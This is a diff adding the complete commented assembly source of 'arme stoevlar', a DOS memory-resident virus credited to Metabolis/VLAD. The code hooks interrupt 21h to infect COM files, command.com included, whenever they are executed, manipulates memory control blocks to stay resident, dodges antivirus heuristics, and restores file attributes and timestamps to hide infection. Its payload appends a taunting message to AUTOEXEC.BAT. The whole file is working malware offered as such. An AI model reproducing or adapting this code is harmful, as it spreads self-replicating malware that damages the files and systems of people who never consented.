@@ -1,0 +1,246 @@
+;
+; "arme stoevlar" by Metabolis/VLAD
+;  army boots.
+;
+; Features.
+; - tsr, infects on execute (4bh)
+; - can infect command.com
+; - won't infect exe files
+; - won't infect com files with MZ
+; - infects files with any attributes
+; - restores file date/time
+; - won't infect large com files (64k)
+; - won't infect files <= 1024 bytes
+; - payload will write this quote to echo in autoexec.bat if a random
+;   number grabbed = sweden's country code.  (not quite random.. but still)
+;   "din mamma har paa sig arme stoevlar!"
+;    (your mum wears army boots!)
+;
+; Thanks to Qark and Dark Angel for help with the tsr code, Quantum
+; for sitting and debugging it while i was coding it (and making a
+; general nuisance of himself too i might add).  Also thanks to Antigen
+; and Rhince for helping with the optimization, they shed many a byte ;)
+; Oh, and thanks to twl for the swedish insights on life the universe and
+; everything. (heh)
+
+	org     0                               ; org 0 so no delta messing
+						; required in tsr part.
+start:
+	db      90h,90h,90h                     ; stub that gets overwritten.
+
+startcode:
+	call    $+3                             ; this will bypass some
+next:   int     3h                              ; heuristics in thunderbyte
+	pop     bp                              ; while still getting the
+	sub     bp, offset next                 ; delta offset.
+
+	lea     si, [bp+offset first3]          ; move the original 3 bytes
+	mov     di, 100h                        ; of the infectee to 100h.
+	cld
+	movsw
+	movsb
+	xchg    si,bp                           ; put delta offset in si.
+
+payload_check:
+        in      al,40h                          ; grab a rand number in al
+	cmp     al,46                           ; +46 = sweden's country code
+	je      payload                         ; equal?  mess with autoexec.
+	jmp     check_res
+
+auto    db 'C:\AUTOEXEC.BAT',00h
+message db 0dh,0ah,'@ECHO din mamma har paa sig arme stoevlar!'
+
+payload:
+	mov     ax,3D01h                        ; now open file with write
+	lea     dx,[si+offset auto]             ; axs, if it can't be done
+	int     21h                             ; load virus.
+	jc      check_res
+	xchg    bx,ax                           ; put file handle in bx
+
+	call    lseek_end
+
+	mov     cx,44                           ; write the message string
+	mov     ah,40h                          ; into c:\autoexec.bat
+	lea     dx,[si+offset message]
+	int     21h
+
+	mov     ah,3eh                          ; close file with handle
+	int     21h                             ; in bx.
+
+check_res:
+	mov     ax,0f00dh                       ; check for previous
+	int     21h                             ; residency.
+	cmp     cx,0f00dh
+	je      no_thanks
+
+get_mcb:
+	mov     ax,ds                          
+	dec     ax                           
+	mov     ds,ax                           ; DS=MCB segment
+	xor     di,di
+	mov     es,di                           ; es=0=vector table segment
+	cmp     byte ptr ds:[di],'Z'            ; check for a Z block
+	jne     no_thanks
+	mov     bx, 84h                         ; 21h*4 - int 21 address
+	sub     word ptr ds:[di+3], (endcode-start+15)/16+1        ; allocate
+	sub     word ptr ds:[di+12h],(endcode-start+15)/16+1       ; allocate
+	mov     ax, word ptr es:[bx]            ; get int 21 ip
+	mov     word ptr [si+bx+(orig_int21_offset-84h+16)],ax  ; save it
+	mov     ax, word ptr es:[bx+2]          ; get int 21 cs
+	mov     word ptr [si+bx+(orig_int21_segment-84h+16)],ax ; save it
+	mov     ax, word ptr ds:[di+12h]        ; es=virus segment in mem
+
+        mov     es,ax
+        mov     byte ptr ds:[di],'M'            ; time to set our own mcb
+	mov	byte ptr es:[di],'Z'
+	mov	word ptr es:[di+1],8
+        mov     word ptr es:[di+3],(endcode-start+15)/16
+	inc	ax
+	mov	es,ax 
+
+	push    cs
+	pop     ds
+	mov     cx,offset endcode
+	rep     movsb                           ; move our virus into memory
+	mov     ds,cx                           ; ds=cx=0
+	mov     word ptr ds:[bx],offset int21handler ;set int 21
+	mov     word ptr ds:[bx+2],es
+
+no_thanks:
+	push    cs
+	pop     ds                              ; restore segment registers
+	push    cs
+	pop     es
+	mov     ax, 0ffh                        ; this will execute the
+	inc     ax                              ; program as normal and
+	jmp     ax                              ; avoid heuristics.
+
+int21handler    proc    far
+	cmp     ax,0f00dh                       ; residency check?
+	jnz     notcheck                        ; nope, let's infect sumfin.
+	xchg    cx,ax                           ; return f00d in cx
+	iret
+
+notcheck:
+	cmp     ah,4bh                          ; execute?
+	je      executing
+
+go_int:
+	db      0eah
+	orig_int21_offset  dw 0                 ; original int21h offset
+	orig_int21_segment dw 0                 ; ""              segment.
+int21handler    endp
+
+executing:
+	push    ax                              ; at this point the filename
+	push    bx                              ; will be in ds:dx btw.
+	push    cx
+	push    dx                              ; push all the registers that
+	push    di                              ; i'll be using in the
+	push    ds                              ; following code.
+	push    es
+
+	push    ds                              ; program which dos is
+	pop     es                              ; executing has an extension
+
+	mov     ax,4300h
+	int     21h
+	push    cx                              ; save attributes
+
+	mov     ax,4301h                        ; set the file's attributes
+	push	ax
+	xor     cx,cx                           ; to nothing.
+	int     21h
+
+	mov     ax,3D02h                        ; now open file with read
+	int     21h                             ; and write axs, if it can't
+	jc      popall                          ; be done, return.
+	xchg    bx,ax                           ; put file handle in bx
+
+	push    cs                              ; move code segment to ours
+	pop     ds                              ; rather than the infectee.
+
+	mov     dx,offset first3                ; read the first 3 bytes from
+	mov     cx,3                            ; the file into first3.
+	mov     ah,03fh
+	int     21h
+
+	mov     ax,word ptr [offset first3]     ; mov the first two bytes of
+	add     al,ah                           ; the file into cx, now add
+	cmp     al,167                          ; them and check if they equal
+	je      close_file                      ; to MZ (167)
+
+	call    lseek_end                       ; move file pointer to eof
+
+	cmp     ax,0fd00h                       ; don't infect files that
+	ja      close_file                      ; are too close to 64k
+
+	cmp     ax,1024                         ; don't infect files that
+	jbe     close_file                      ; are <= 1024 bytes
+
+	sub     ax,offset endcode               ; subtract the virus length
+	cmp     word ptr [first3+1],ax          ; see if jump is to virus
+	je      close_file                      ; file already infected
+	add     ax,endcode-startcode            ; add on to know where to
+	mov     word ptr [infjump+1],ax         ; jump to and fix it up
+
+	mov     ax,4200h                        ; lseek to beginning of file
+	call    lseek_end+3
+
+	mov     ax,5700h                        ; get file date and time
+	int     21h
+	push    dx                              ; push date/time for use
+	push    cx                              ; in restoring later.
+
+	mov     cx,3                            ; write 3 bytes to file
+	mov     ah,40h                          ; (the new jump to the
+	mov     dx,offset infjump               ; virus)
+	int     21h
+
+	call    lseek_end                       ; move to the end of the file
+
+	mov     cx,endcode-startcode            ; write the virus
+	mov     ah,40h                          ; to the end of the
+	mov     dx,offset startcode             ; file
+	int     21h
+
+	pop     cx                              ; pop the file date/time
+	pop     dx                              ; back into cx and dx
+	mov     ax,5701h                        ; write the file/date to
+	int     21h                             ; the file.
+
+close_file:
+	mov     ah,3eh                          ; close file with handle
+	int     21h                             ; in bx.
+
+popall:
+	pop	ax				; restore file attrs and 4301h
+	pop	cx
+	pop     es                              ; fix up all the regs
+	pop     ds                              ; that we messed with
+	pop     di                              ; before entering the
+	pop     dx                              ; infection procedure.
+	int	21h				; write old attrs to file.
+
+	pop     cx
+	pop     bx
+	pop     ax
+	jmp     go_int                          ; execute original int21h
+
+lseek_end:
+	mov     ax,4202h                        ; get to the end
+	cwd                                     ; of the file (xor dx,dx)
+	xor     cx,cx
+	int     21h
+	ret
+
+author  db      'Metabolis/VLAD',00h            ; won't bother with name ;)
+infjump db      0e9h,00h,00h                    ; new first 3 bytes
+first3  db      0cdh,20h,00h                    ; infectee's original 3 bytes
+
+endcode:
+
+; This is my first TSR virus, and I'm not really too worried about
+; the heuristics it triggers (too many to mention) at the moment.
+; Perhaps in my next one we'll see what we can do ;)
+;
